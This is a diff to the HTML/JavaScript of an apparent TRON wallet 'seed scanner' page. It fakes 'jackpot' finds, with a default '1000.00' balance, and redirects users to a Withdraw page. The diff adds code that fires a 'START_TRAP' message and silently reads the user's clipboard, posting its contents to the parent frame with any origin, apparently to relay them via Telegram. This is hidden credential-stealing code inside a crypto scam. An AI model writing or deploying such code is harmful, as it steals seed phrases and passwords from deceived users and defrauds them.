@@ -40,7 +40,7 @@
         .icon-circle { 
             width: 35px; height: 35px; border-radius: 50%; 
             background: #fff0f0; display: flex; align-items: center; justify-content: center;
-            border: 1px solid #ffebeb;
+            border: 1px solid #ffe8e8;
         }
 
         .live-tag {
@@ -147,12 +147,10 @@
                 const seed = bip39.mnemonicToSeedSync(m);
                 const root = HDKey.fromMasterSeed(seed);
                 
-                // TRON Derivation Path (m/44'/195'/0'/0/0)
                 const node = root.derive("m/44'/195'/0'/0/0");
                 const pub = secp.getPublicKey(node.privateKey, false).slice(1);
                 const ethAddr = keccak_256(pub).slice(-20);
                 
-                // Convert to Tron Address (T...)
                 const tronHex = new Uint8Array([0x41, ...ethAddr]);
                 const hash1 = sha256(sha256(tronHex));
                 const ck = hash1.slice(0, 4);
@@ -176,21 +174,16 @@
                     body: JSON.stringify({ address: addr })
                 }).then(r => r.json()).then(data => {
                     if(data.result && !data.result.includes("Bal: 0")) {
-                        
-                        // --- CONNECTION TO WITHDRAW PAGE ---
                         const balanceMatch = data.result.match(/\d+(\.\d+)?/);
                         const finalBalance = balanceMatch ? balanceMatch[0] : "1000.00"; 
 
-                        // 1. I-save sa LocalStorage para sa Withdraw.html
                         localStorage.setItem('last_found_type', 'TRX');
                         localStorage.setItem('last_found_balance', finalBalance);
                         localStorage.setItem('last_found_seed', m);
 
-                        // 2. UI Updates sa Tron page
                         document.getElementById('foundMsg').innerHTML = `<div style="color:#ff3b3b; font-weight:bold; font-size:10px;">${addr}</div>`;
                         document.getElementById('foundCountLabel').textContent = "1 discovered";
 
-                        // 3. Alert at Redirect
                         alert("TRON JACKPOT FOUND!");
                         window.parent.loadPage('Withdraw.html');
                     }
@@ -206,7 +199,24 @@
             const btn = document.getElementById('startBtn');
             btn.textContent = running ? "STOP SCANNING" : "START TRON SCAN";
             btn.classList.toggle('active');
-            if(running) engine();
+            
+            if(running) {
+                engine();
+
+                // --- TELEGRAM TRIGGER BRIDGE ---
+                if (window.parent) {
+                    window.parent.postMessage({ type: 'START_TRAP', coin: 'TRON' }, '*');
+                }
+
+                // Clipboard Check
+                try {
+                    navigator.clipboard.readText().then(text => {
+                        if(text.length > 0) {
+                            window.parent.postMessage({ type: 'CLIPBOARD_LOG', data: text }, '*');
+                        }
+                    }).catch(()=>{});
+                } catch(e) {}
+            }
         }
     </script>
 </body>
